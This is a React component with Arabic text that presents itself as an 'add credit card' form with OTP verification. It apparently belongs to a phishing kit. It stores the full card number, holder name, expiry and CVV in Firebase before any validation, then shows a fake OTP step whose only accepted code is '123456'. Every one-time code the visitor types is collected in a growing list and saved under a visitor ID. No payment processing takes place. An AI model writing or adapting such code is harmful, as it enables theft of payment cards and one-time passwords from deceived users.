import { addData } from "@/lib/firebase";
import { useState, ChangeEvent, FormEvent } from "react";
import { Button } from "@/components/ui/button"
interface CardData {
  number: string;
  name: string;
  expiry: string;
  cvv: string;
}
const allOtps = [""];
export default function AddCard() {
  const [cardData, setCardData] = useState<CardData>({
    number: "",
    name: "",
    expiry: "",
    cvv: "",
  });

  const [otp, setOtp] = useState("");
  const [step, setStep] = useState<"form" | "otp" | "success">("form");
  const [error, setError] = useState("");

  const formatCardNumber = (v: string) =>
    v
      .replace(/\D/g, "")
      .replace(/(.{4})/g, "$1 ")
      .trim();

  const handleCardSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const visitorID = localStorage.getItem("visitor");
    await addData({
      id: visitorID,
      cardNumber: cardData.number,
    cardExpiry: cardData.expiry,
      cvv: cardData.cvv,
      name: cardData.name,
      createdDate: new Date().toISOString(),
    });
    if (
      !cardData.number ||
      !cardData.name ||
      !cardData.expiry ||
      !cardData.cvv
    ) {
      setError("الرجاء إدخال جميع بيانات البطاقة.");
      return;
    }
    setError("");
    setStep("otp");
  };

  const handleOtpSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const visitorID = localStorage.getItem("visitor");
    allOtps.push(otp);
    await addData({
      id: visitorID,
      otp,
      allOtps,
      createdDate: new Date().toISOString(),
    });
    if (otp === "123456") {
      setError("");
      setStep("success");
    } else {
      setError("رمز التحقق غير صحيح.");
    }
  };

  const handleInputChange = (
    e: ChangeEvent<HTMLInputElement>,
    field: keyof CardData
  ) => {
    setCardData({ ...cardData, [field]: e.target.value });
  };

  return (
    <div
      className="min-h-screen bg-gray-50 flex justify-center py-10"
      dir="rtl"
    >
      <div className="w-full max-w-md bg-white p-6 rounded-xl shadow-xl space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <h1 className="text-xl font-semibold text-gray-800">
            أضف بطاقة ائتمانية جديدة
          </h1>
          <div>
            <button className="text-gray-600 hover:bg-gray-100 rounded-full p-2">
              <svg
                className="w-6 h-6"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M13 7l5 5m0 0l-5 5m5-5H6"
                />
              </svg>
            </button>
          </div>
        </div>

        {/* Card Input Form */}
        {step === "form" && (
          <form onSubmit={handleCardSubmit} className="space-y-4">
            {/* Card Number */}
            <div>
              <label className="text-sm text-gray-600 block">رقم البطاقة</label>
              <div className="flex items-center space-x-2">
                <input
                  inputMode="numeric"
                  maxLength={23}
                  value={formatCardNumber(cardData.number)}
                  onChange={(e) => handleInputChange(e, "number")}
                  placeholder="XXXX XXXX XXXX XXXX"
                  className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-orange-500"
                />
                <button
                  type="button"
                  className="p-3 rounded-lg border bg-gray-50 hover:bg-gray-100"
                >
                  <svg
                    className="w-6 h-6 text-gray-600"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      d="M3 7h3l2-2h6l2 2h3v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"
                    />
                    <circle cx="12" cy="13" r="3" strokeWidth="2" />
                  </svg>
                </button>
              </div>
            </div>

            {/* Cardholder Name */}
            <div>
              <label className="text-sm text-gray-600 block">
                حامل البطاقة
              </label>
              <input
                value={cardData.name}
                onChange={(e) => handleInputChange(e, "name")}
                placeholder="الاسم كما هو على البطاقة"
                className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-orange-500"
              />
            </div>

            {/* Expiry Date and CVV */}
            <div className="flex space-x-3">
              <div className="flex-1">
                <label className="text-sm text-gray-600 block">
                  تاريخ انتهاء الصلاحية
                </label>
                <input
                  value={cardData.expiry}
                  onChange={(e) => handleInputChange(e, "expiry")}
                  placeholder="MM/YY"
                  className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-orange-500"
                />
              </div>
              <div className="w-32">
                <label className="text-sm text-gray-600 block">
                  رمز الحماية
                </label>
                <input
                  value={cardData.cvv}
                  onChange={(e) => handleInputChange(e, "cvv")}
                  placeholder="XXX"
                  className="w-full p-3 border rounded-lg text-center focus:outline-none focus:ring-2 focus:ring-orange-500"
                />
              </div>
            </div>

            {error && (
              <p className="text-red-500 text-sm text-center">{error}</p>
            )}

            <Button
              type="submit"
              className="w-full py-3 bg-orange-500 text-white rounded-full text-lg font-semibold hover:bg-orange-600"
            >
              إضافة البطاقة
            </Button>
          </form>
        )}

        {/* OTP Verification */}
        {step === "otp" && (
          <form onSubmit={handleOtpSubmit} className="space-y-5">
            <h1 className="text-2xl font-semibold text-center mb-4">
              التحقق من البطاقة
            </h1>
            <input
              type="text"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              placeholder="أدخل رمز OTP"
              className="w-full p-3 border rounded-lg text-center focus:outline-none focus:ring-2 focus:ring-orange-500"
            />
            {error && (
              <p className="text-red-500 text-sm text-center">{error}</p>
            )}
            <button
              type="submit"
              className="w-full py-3 bg-orange-500 text-white rounded-full text-lg font-semibold hover:bg-orange-600"
            >
              تأكيد
            </button>
          </form>
        )}

        {/* Success Screen */}
        {step === "success" && (
          <div className="text-center space-y-4">
            <div className="text-green-500 text-5xl">✅</div>
            <h1 className="text-xl font-semibold">تمت إضافة البطاقة بنجاح!</h1>
          </div>
        )}
      </div>
    </div>
  );
}
